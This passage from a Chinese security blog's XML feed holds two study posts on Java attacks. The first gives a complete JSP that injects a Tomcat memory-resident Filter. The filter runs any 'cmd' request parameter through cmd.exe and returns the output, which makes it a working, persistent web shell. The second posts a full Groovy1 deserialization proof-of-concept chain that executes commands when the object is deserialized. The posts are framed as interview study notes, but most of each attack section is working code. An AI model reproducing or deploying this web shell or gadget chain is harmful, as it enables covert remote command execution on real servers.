    <link href="/2022/04/11/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AFilter%E5%9E%8B/"/>
    <url>/2022/04/11/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AFilter%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-内存马：Filter型"><a href="#Tomcat-内存马：Filter型" class="headerlink" title="Tomcat 内存马：Filter型"></a>Tomcat 内存马：Filter型</h1><p>不用想今天晚上的面试多半会问道内存码相关的东西，奈何自己以前也就只是用网上的东西现成东西。来学学吧，至少晚上问到了还能bb两句。<br><strong>这篇文章相当于是个了解Filter+环境配置！</strong></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a><br>然后为了方便后续的调试，记得导入<code>catalina.jar</code>包。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Test;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        Filter.<span class="hljs-built_in">super</span>.init(filterConfig);<br>        System.out.println(<span class="hljs-string">&quot;Filter 初始化创建&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行过滤操作&quot;</span>);<br>        filterChain.doFilter(servletRequest,servletResponse);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        Filter.<span class="hljs-built_in">super</span>.destroy();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <br><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>Test.FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/demo<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后在访问&#x2F;demo的时候出现。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204111607015.png" alt="QQ截图20220411160730"></p><p>然后就是调试。</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>这里跟着这位<a href="https://xz.aliyun.com/t/10362#toc-2">师傅</a>学习的。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204111701165.png" alt="QQ截图20220411160807"></p><p>下入断点。</p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204111608674.png" alt="QQ截图20220411160841"></p><p>这里就不做无聊的工作了。</p><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p><strong>FilterMaps</strong>：存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern。</p><p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息。</p><p><strong>FilterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p><p>也就说这里可以进行控制这些来达成内存马注入。（这里当然要自己导入包，因为自己在windows上得复现，这里修改了一些作者得原代码。）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xs&quot;</span>;<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;<br>                    <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><span class="hljs-comment">//                    Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span><br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;).start();<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                    servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes,<span class="hljs-number">0</span>,len));<br>                    process.destroy();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                filterChain.doFilter(servletRequest,servletResponse);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>            &#125;<br><br>        &#125;;<br><br><br>        <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 将filterDef添加到filterDefs中</span><br><span class="hljs-comment">         */</span><br>        standardContext.addFilterDef(filterDef);<br><br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>        filterMap.setFilterName(name);<br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>        standardContext.addFilterMapBefore(filterMap);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>        filterConfigs.put(name,filterConfig);<br>        out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204111658193.png" alt="QQ截图20220411165825"></p>]]></content>
    
    
    <categories>
      
      <category>内存马</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Groovy1</title>
    <link href="/2022/04/10/Groovy1/"/>
    <url>/2022/04/10/Groovy1/</url>
    
    <content type="html"><![CDATA[<h1 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;dependencies&gt;</span><br><span class="hljs-section">&lt;dependency&gt;</span><br><span class="hljs-section">&lt;groupId&gt;</span><span class="hljs-attribute">org</span>.codehaus.groovy&lt;/groupId&gt;<br><span class="hljs-section">&lt;artifactId&gt;</span><span class="hljs-attribute">groovy</span>&lt;/artifactId&gt;<br><span class="hljs-section">&lt;version&gt;</span><span class="hljs-attribute">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>&lt;/version&gt;  //这里版本<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">0</span>-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">3</span>均可<br><span class="hljs-section">&lt;/dependency&gt;</span><br><span class="hljs-section">&lt;/dependencies&gt;</span><br></code></pre></td></tr></table></figure><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span>entry<span class="hljs-constructor">Set()</span> (Proxy)<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConversionHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConvertedClosure</span>.</span></span>invoke<span class="hljs-constructor">Custom()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MethodClosure</span>.</span></span>call<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ProcessGroovyMethods</span>.</span></span>execute<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="MethodClosure-call"><a href="#MethodClosure-call" class="headerlink" title="MethodClosure.call()"></a>MethodClosure.call()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101311567.png" alt="QQ截图20220410131046"></p><p>这里可以看到接收了一个对象和一个方法。并且有doCall方法进行反射。<br>那么我们可以这样做！</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Groovy1Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">MethodClosure</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="hljs-string">&quot;exec&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">doCall</span> <span class="hljs-operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="hljs-string">&quot;doCall&quot;</span>, Object.class);<br>        doCall.setAccessible(<span class="hljs-literal">true</span>);<br>        doCall.invoke(exec,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512217.png" alt="QQ截图20220410132039"></p><p>但是这里Runtime.getRuntime并不可以反序列化。</p><h2 id="ProcessGroovyMethods-execute"><a href="#ProcessGroovyMethods-execute" class="headerlink" title="ProcessGroovyMethods.execute()"></a>ProcessGroovyMethods.execute()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512562.png" alt="QQ截图20220410132259"></p><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">MethodClosure methodClosure = <span class="hljs-keyword">new</span> MethodClosure(<span class="hljs-string">&quot;calc.exe&quot;</span>, <span class="hljs-string">&quot;execute&quot;</span>);<br>        methodClosure.<span class="hljs-keyword">call</span>();<br></code></pre></td></tr></table></figure><p>这里调试看一下，call方法，一路走下来。会来到这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512182.png" alt="QQ截图20220410140457"></p><p>继续跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512760.png" alt="QQ截图20220410140520"></p><p>最后则会来到ProcessGroovyMethods.execute()并且传入参数。<br>并且这里继承了Serializable，可以反序列化。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101416020.png" alt="QQ截图20220410141638"></p><h2 id="AnnotationInvocationHandler-readObject"><a href="#AnnotationInvocationHandler-readObject" class="headerlink" title="AnnotationInvocationHandler.readObject()"></a>AnnotationInvocationHandler.readObject()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512342.png" alt="QQ截图20220410144159"></p><p><strong>这里可以清楚的看到var4.entrySet()，如果var4为动态代理创建的map对象，那么如果调用了接口的任意方法，就会实现接口方法处理类的invoke方法。</strong></p><h2 id="ConversionHandler-invoke"><a href="#ConversionHandler-invoke" class="headerlink" title="ConversionHandler.invoke()"></a>ConversionHandler.invoke()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512919.png" alt="QQ截图20220410144454"></p><p>进去瞧瞧。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512446.png" alt="QQ截图20220410144502"></p><p>可以清楚的看到接口了InvocationHandler。也就是说可以实现这里的invoke。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101446179.png" alt="QQ截图20220410144635"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512842.png" alt="QQ截图20220410144713"><br>这里又可以看到回到了InvokeCustom，并且这里的判断是否满足Object方法。如果满足就会进入这里。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512448.png" alt="QQ截图20220410150444"></p><p>这里进行了一些判断。而这里只需要一些构造就可以满足。</p><p>然后下面的getDelegate就是会调用父类的函数。就不跟了。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Groovy1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//封装我们需要执行的对象</span><br>        <span class="hljs-type">MethodClosure</span> <span class="hljs-variable">methodClosure</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodClosure</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>, <span class="hljs-string">&quot;execute&quot;</span>);<br>        <span class="hljs-type">ConvertedClosure</span> <span class="hljs-variable">closure</span>       <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConvertedClosure</span>(methodClosure, <span class="hljs-string">&quot;entrySet&quot;</span>);<br><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 创建 ConvertedClosure 的动态代理类实例</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, closure);<br><br>        <span class="hljs-comment">// 使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, handler);<br>        serialize(invocationHandler);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring2</title>
    <link href="/2022/04/09/Spring2/"/>
    <url>/2022/04/09/Spring2/</url>
    
